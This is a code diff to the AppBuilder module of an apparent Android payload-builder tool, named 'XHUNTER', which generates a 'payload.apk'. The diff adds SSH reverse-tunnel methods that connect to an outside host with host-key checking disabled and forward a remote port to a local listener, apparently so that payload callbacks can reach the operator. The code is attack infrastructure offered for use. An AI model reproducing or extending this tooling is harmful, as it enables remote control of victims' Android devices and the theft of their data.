@@ -22,6 +22,9 @@ import com.facebook.react.bridge.WritableArray;
 import com.facebook.react.bridge.WritableMap;
 import com.facebook.react.bridge.WritableNativeArray;
 import com.facebook.react.bridge.WritableNativeMap;
+import com.jcraft.jsch.JSch;
+import com.jcraft.jsch.JSchException;
+import com.jcraft.jsch.Session;
 
 import net.dongliu.apk.parser.ApkFile;
 
@@ -63,6 +66,7 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
     private final ReactApplicationContext reactContext;
     private final String working_dir= Environment.getExternalStorageDirectory().getPath()+"/XHUNTER/payload/";
     private final String payload_name="payload.apk";
+    Session session= null;
     List<String> filesListInDir = new ArrayList<String>();
     AppBuilderModule(ReactApplicationContext context) {
         super(context);
@@ -74,6 +78,44 @@ public class AppBuilderModule extends ReactContextBaseJavaModule {
     public String getName() {
         return "AppBuilder";
     }
+    @ReactMethod
+    public void sshTunnel(String user, String host, String pass, int rport, String lhost, int lport, Promise promise){
+        WritableMap params = Arguments.createMap();
+        params.putString("message", "[+] Created secure ssh tunnel successfully!");
+        try{
+            if(session!=null && session.isConnected()){
+                promise.reject("e","[!] Ssh tunnel already connected!");
+            }else {
+                java.util.Properties config = new java.util.Properties();
+                config.put("StrictHostKeyChecking", "no");
+                JSch jsch = new JSch();
+                session = jsch.getSession(user, host, 22);
+                session.setPassword(pass);
+                session.setConfig(config);
+                session.connect();
+                session.setPortForwardingR(rport, lhost, lport);
+                promise.resolve(params);
+            }
+        } catch (SecurityException | JSchException e){
+            e.printStackTrace();
+            promise.reject("e","[!] Failed to create secure ssh tunnel");
+        }
+    }
+    @ReactMethod
+    public void sshTunnelDisconnect(Promise promise){
+        WritableMap params = Arguments.createMap();
+        params.putString("message", "[+] Ssh tunnel disconnect!");
+        try{
+            if(session!=null && session.isConnected()){
+                session.disconnect();
+                promise.resolve(params);
+            }
+        } catch (SecurityException e){
+            e.printStackTrace();
+            promise.reject("e","[!] Failed to stop secure ssh tunnel");
+        }
+    }
+
     @ReactMethod
     public void readDB(String path, String query, Promise promise){
         try{
